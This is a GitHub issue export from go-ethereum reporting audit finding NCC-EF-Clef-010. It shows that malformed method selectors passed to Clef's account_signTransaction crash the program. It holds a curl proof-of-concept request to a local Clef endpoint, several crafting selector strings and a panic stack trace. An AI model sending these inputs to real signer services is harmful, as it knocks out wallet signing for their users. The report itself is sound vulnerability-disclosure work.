{
  "url": "https://api.github.com/repos/ethereum/go-ethereum/issues/17633",
  "repository_url": "https://api.github.com/repos/ethereum/go-ethereum",
  "labels_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/17633/labels{/name}",
  "comments_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/17633/comments",
  "events_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/17633/events",
  "html_url": "https://github.com/ethereum/go-ethereum/issues/17633",
  "id": 358946966,
  "node_id": "MDU6SXNzdWUzNTg5NDY5NjY=",
  "number": 17633,
  "title": "Clef: DoS through malicious method selector ",
  "user": {
    "login": "holiman",
    "id": 142290,
    "node_id": "MDQ6VXNlcjE0MjI5MA==",
    "avatar_url": "https://avatars.githubusercontent.com/u/142290?v=4",
    "gravatar_id": "",
    "url": "https://api.github.com/users/holiman",
    "html_url": "https://github.com/holiman",
    "followers_url": "https://api.github.com/users/holiman/followers",
    "following_url": "https://api.github.com/users/holiman/following{/other_user}",
    "gists_url": "https://api.github.com/users/holiman/gists{/gist_id}",
    "starred_url": "https://api.github.com/users/holiman/starred{/owner}{/repo}",
    "subscriptions_url": "https://api.github.com/users/holiman/subscriptions",
    "organizations_url": "https://api.github.com/users/holiman/orgs",
    "repos_url": "https://api.github.com/users/holiman/repos",
    "events_url": "https://api.github.com/users/holiman/events{/privacy}",
    "received_events_url": "https://api.github.com/users/holiman/received_events",
    "type": "User",
    "site_admin": false
  },
  "labels": [
    {
      "id": 1053006445,
      "node_id": "MDU6TGFiZWwxMDUzMDA2NDQ1",
      "url": "https://api.github.com/repos/ethereum/go-ethereum/labels/area:clef",
      "name": "area:clef",
      "color": "1d76db",
      "default": false,
      "description": ""
    }
  ],
  "state": "closed",
  "locked": false,
  "assignee": {
    "login": "holiman",
    "id": 142290,
    "node_id": "MDQ6VXNlcjE0MjI5MA==",
    "avatar_url": "https://avatars.githubusercontent.com/u/142290?v=4",
    "gravatar_id": "",
    "url": "https://api.github.com/users/holiman",
    "html_url": "https://github.com/holiman",
    "followers_url": "https://api.github.com/users/holiman/followers",
    "following_url": "https://api.github.com/users/holiman/following{/other_user}",
    "gists_url": "https://api.github.com/users/holiman/gists{/gist_id}",
    "starred_url": "https://api.github.com/users/holiman/starred{/owner}{/repo}",
    "subscriptions_url": "https://api.github.com/users/holiman/subscriptions",
    "organizations_url": "https://api.github.com/users/holiman/orgs",
    "repos_url": "https://api.github.com/users/holiman/repos",
    "events_url": "https://api.github.com/users/holiman/events{/privacy}",
    "received_events_url": "https://api.github.com/users/holiman/received_events",
    "type": "User",
    "site_admin": false
  },
  "assignees": [
    {
      "login": "holiman",
      "id": 142290,
      "node_id": "MDQ6VXNlcjE0MjI5MA==",
      "avatar_url": "https://avatars.githubusercontent.com/u/142290?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/holiman",
      "html_url": "https://github.com/holiman",
      "followers_url": "https://api.github.com/users/holiman/followers",
      "following_url": "https://api.github.com/users/holiman/following{/other_user}",
      "gists_url": "https://api.github.com/users/holiman/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/holiman/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/holiman/subscriptions",
      "organizations_url": "https://api.github.com/users/holiman/orgs",
      "repos_url": "https://api.github.com/users/holiman/repos",
      "events_url": "https://api.github.com/users/holiman/events{/privacy}",
      "received_events_url": "https://api.github.com/users/holiman/received_events",
      "type": "User",
      "site_admin": false
    }
  ],
  "milestone": null,
  "comments": 1,
  "created_at": "2018-09-11T08:47:45Z",
  "updated_at": "2018-09-25T20:04:17Z",
  "closed_at": "2018-09-25T20:04:17Z",
  "author_association": "MEMBER",
  "active_lock_reason": null,
  "body": "Ref: NCC-EF-Clef-010\r\n\r\nAn attacker with access to Clefâ€™s API can crash the application.The `account_signTransaction` calls `MethodSelectorToAbi` which is too lenient in the regexp, and the program can crash. \r\n```\r\ncurl -i -H \"Content-Type: application/json\" -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"account_signTransaction\",\"params\":[{\"from\":\"0x82A2A876D39022B3019932D30Cd9c97ad5616813\",\"gas\":\"0x333\",\"gasPrice\":\"0x123\",\"nonce\":\"0x0\",\"to\":\"0x07a565b7ed7d7a678680a4c162885bedbb695fe0\", \"value\":\"0x10\", \"data\":\"0x4401a6e40000000000000000000000000000000000000000000000000000000000000012\"}, \"func(uint256,uint256,[]uint256)\"],\"id\":67}' http://localhost:8550/\r\n```\r\n\r\n\r\nSome examples \r\n```\r\nfunc(uint256,uint256,[]uint256)\r\nfunc(uint256,uint256,uint256,)\r\nfunc(,uint256,uint256,uint256)\r\n```",
  "closed_by": {
    "login": "holiman",
    "id": 142290,
    "node_id": "MDQ6VXNlcjE0MjI5MA==",
    "avatar_url": "https://avatars.githubusercontent.com/u/142290?v=4",
    "gravatar_id": "",
    "url": "https://api.github.com/users/holiman",
    "html_url": "https://github.com/holiman",
    "followers_url": "https://api.github.com/users/holiman/followers",
    "following_url": "https://api.github.com/users/holiman/following{/other_user}",
    "gists_url": "https://api.github.com/users/holiman/gists{/gist_id}",
    "starred_url": "https://api.github.com/users/holiman/starred{/owner}{/repo}",
    "subscriptions_url": "https://api.github.com/users/holiman/subscriptions",
    "organizations_url": "https://api.github.com/users/holiman/orgs",
    "repos_url": "https://api.github.com/users/holiman/repos",
    "events_url": "https://api.github.com/users/holiman/events{/privacy}",
    "received_events_url": "https://api.github.com/users/holiman/received_events",
    "type": "User",
    "site_admin": false
  },
  "reactions": {
    "url": "https://api.github.com/repos/ethereum/go-ethereum/issues/17633/reactions",
    "total_count": 0,
    "+1": 0,
    "-1": 0,
    "laugh": 0,
    "hooray": 0,
    "confused": 0,
    "heart": 0,
    "rocket": 0,
    "eyes": 0
  },
  "timeline_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/17633/timeline",
  "performed_via_github_app": null,
  "state_reason": "completed"
}
[
  {
    "url": "https://api.github.com/repos/ethereum/go-ethereum/issues/comments/420543424",
    "html_url": "https://github.com/ethereum/go-ethereum/issues/17633#issuecomment-420543424",
    "issue_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/17633",
    "id": 420543424,
    "node_id": "MDEyOklzc3VlQ29tbWVudDQyMDU0MzQyNA==",
    "user": {
      "login": "holiman",
      "id": 142290,
      "node_id": "MDQ6VXNlcjE0MjI5MA==",
      "avatar_url": "https://avatars.githubusercontent.com/u/142290?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/holiman",
      "html_url": "https://github.com/holiman",
      "followers_url": "https://api.github.com/users/holiman/followers",
      "following_url": "https://api.github.com/users/holiman/following{/other_user}",
      "gists_url": "https://api.github.com/users/holiman/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/holiman/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/holiman/subscriptions",
      "organizations_url": "https://api.github.com/users/holiman/orgs",
      "repos_url": "https://api.github.com/users/holiman/repos",
      "events_url": "https://api.github.com/users/holiman/events{/privacy}",
      "received_events_url": "https://api.github.com/users/holiman/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2018-09-12T07:32:42Z",
    "updated_at": "2018-09-12T07:37:21Z",
    "author_association": "MEMBER",
    "body": "Stack:\r\n```\r\ngithub.com/ethereum/go-ethereum/rpc.(*Server).serveRequest.func1(0xc4200a53b0, 0xd76440, 0xc4202c01e0)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/rpc/server.go:132 +0xf4\r\npanic(0xb8eb80, 0x133a000)\r\n\t/usr/local/go/src/runtime/panic.go:505 +0x229\r\nencoding/json.(*decodeState).unmarshal.func1(0xc42034c848)\r\n\t/usr/local/go/src/encoding/json/decode.go:175 +0xd4\r\npanic(0xb8eb80, 0x133a000)\r\n\t/usr/local/go/src/runtime/panic.go:505 +0x229\r\nencoding/json.(*decodeState).unmarshal.func1(0xc42034c428)\r\n\t/usr/local/go/src/encoding/json/decode.go:175 +0xd4\r\npanic(0xb8eb80, 0x133a000)\r\n\t/usr/local/go/src/runtime/panic.go:505 +0x229\r\ngithub.com/ethereum/go-ethereum/accounts/abi.NewType(0xc42047c680, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc42047c680, 0x0, ...)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/accounts/abi/type.go:106 +0x1019\r\ngithub.com/ethereum/go-ethereum/accounts/abi.NewType(0xc42047c680, 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc42047c680, 0x9, ...)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/accounts/abi/type.go:74 +0x1d2\r\ngithub.com/ethereum/go-ethereum/accounts/abi.(*Argument).UnmarshalJSON(0xc4201c8fd0, 0xc42023e452, 0x14, 0x1ae, 0x0, 0x7ba654083208)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/accounts/abi/argument.go:48 +0x14c\r\nencoding/json.(*decodeState).object(0xc4200e67e0, 0xbdf0c0, 0xc4201c8fd0, 0x199)\r\n\t/usr/local/go/src/encoding/json/decode.go:604 +0x1c9d\r\nencoding/json.(*decodeState).value(0xc4200e67e0, 0xbdf0c0, 0xc4201c8fd0, 0x199)\r\n\t/usr/local/go/src/encoding/json/decode.go:408 +0x2d3\r\nencoding/json.(*decodeState).array(0xc4200e67e0, 0xb390a0, 0xc4201c8c88, 0x197)\r\n\t/usr/local/go/src/encoding/json/decode.go:561 +0x1d0\r\nencoding/json.(*decodeState).value(0xc4200e67e0, 0xb390a0, 0xc4201c8c88, 0x197)\r\n\t/usr/local/go/src/encoding/json/decode.go:405 +0x266\r\nencoding/json.(*decodeState).object(0xc4200e67e0, 0xc15380, 0xc4201c8c60, 0x199)\r\n\t/usr/local/go/src/encoding/json/decode.go:754 +0x132d\r\nencoding/json.(*decodeState).value(0xc4200e67e0, 0xc15380, 0xc4201c8c60, 0x199)\r\n\t/usr/local/go/src/encoding/json/decode.go:408 +0x2d3\r\nencoding/json.(*decodeState).array(0xc4200e67e0, 0xb1e840, 0xc42047a820, 0x16)\r\n\t/usr/local/go/src/encoding/json/decode.go:561 +0x1d0\r\nencoding/json.(*decodeState).value(0xc4200e67e0, 0xb1e840, 0xc42047a820, 0x16)\r\n\t/usr/local/go/src/encoding/json/decode.go:405 +0x266\r\nencoding/json.(*decodeState).unmarshal(0xc4200e67e0, 0xb1e840, 0xc42047a820, 0x0, 0x0)\r\n\t/usr/local/go/src/encoding/json/decode.go:189 +0x1e7\r\nencoding/json.Unmarshal(0xc42023e400, 0x69, 0x200, 0xb1e840, 0xc42047a820, 0x4573b8, 0xc42047c550)\r\n\t/usr/local/go/src/encoding/json/decode.go:108 +0x148\r\ngithub.com/ethereum/go-ethereum/accounts/abi.(*ABI).UnmarshalJSON(0xc420088cc0, 0xc42023e400, 0x69, 0x200, 0x0, 0x7ba6540831e8)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/accounts/abi/abi.go:105 +0x88\r\nencoding/json.(*decodeState).array(0xc42030e3e8, 0xbb7b60, 0xc420088cc0, 0x16)\r\n\t/usr/local/go/src/encoding/json/decode.go:495 +0xb11\r\nencoding/json.(*decodeState).value(0xc42030e3e8, 0xbb7b60, 0xc420088cc0, 0x16)\r\n\t/usr/local/go/src/encoding/json/decode.go:405 +0x266\r\nencoding/json.(*decodeState).unmarshal(0xc42030e3e8, 0xbb7b60, 0xc420088cc0, 0x0, 0x0)\r\n\t/usr/local/go/src/encoding/json/decode.go:189 +0x1e7\r\nencoding/json.(*Decoder).Decode(0xc42030e3c0, 0xbb7b60, 0xc420088cc0, 0x20, 0xbe8cc0)\r\n\t/usr/local/go/src/encoding/json/stream.go:73 +0x1a7\r\ngithub.com/ethereum/go-ethereum/accounts/abi.JSON(0xd69960, 0xc42047a7e0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, ...)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/accounts/abi/abi.go:40 +0xbf\r\ngithub.com/ethereum/go-ethereum/signer/core.parseCallData(0xc42033c060, 0x24, 0x24, 0xc4200860e0, 0x69, 0x69, 0x0, 0xbc43e0)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/signer/core/abihelper.go:77 +0x121\r\ngithub.com/ethereum/go-ethereum/signer/core.testSelector(0xc420382140, 0x1f, 0xc42033c060, 0x24, 0x24, 0xc42033c1b0, 0x7ba6540c16c8, 0x0)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/signer/core/validation.go:58 +0xb6\r\ngithub.com/ethereum/go-ethereum/signer/core.(*Validator).validateCallData(0xc4200ba1a8, 0xc42047a5c0, 0xc42033c060, 0x24, 0x24, 0xc42046c200)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/signer/core/validation.go:81 +0x62b\r\ngithub.com/ethereum/go-ethereum/signer/core.(*Validator).validate(0xc4200ba1a8, 0xc42047a5c0, 0xc42034d2d8, 0xc42046c200, 0x0, 0x0)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/signer/core/validation.go:153 +0x652\r\ngithub.com/ethereum/go-ethereum/signer/core.(*Validator).ValidateTransaction(0xc4200ba1a8, 0xc42034d2d8, 0xc42046c200, 0xc420010000, 0x1de, 0x3c0)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/signer/core/validation.go:162 +0x59\r\ngithub.com/ethereum/go-ethereum/signer/core.(*SignerAPI).SignTransaction(0xc4200a52f0, 0xd724c0, 0xc420242540, 0xb32290d376a8a282, 0x7ac9d90cd3329901, 0x136861d5, 0xc42033c000, 0x2a, 0xc420256bd0, 0x333, ...)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/signer/core/api.go:320 +0x8f\r\ngithub.com/ethereum/go-ethereum/signer/core.(*AuditLogger).SignTransaction(0xc42040f160, 0xd724c0, 0xc420242540, 0xb32290d376a8a282, 0x7ac9d90cd3329901, 0x136861d5, 0xc42033c000, 0x2a, 0xc420256bd0, 0x333, ...)\r\n\t/home/user/go/src/github.com/ethereum/go-ethereum/signer/core/auditlog.go:58 +0x37d\r\nreflect.Value.call(0xc420106600, 0xc4200ba2e8, 0x13, 0xc76a30, 0x4, 0xc420088b40, 0x4, 0x4, 0x2, 0xc420088b40, ...)\r\n\r\n```",
    "reactions": {
      "url": "https://api.github.com/repos/ethereum/go-ethereum/issues/comments/420543424/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  }
]
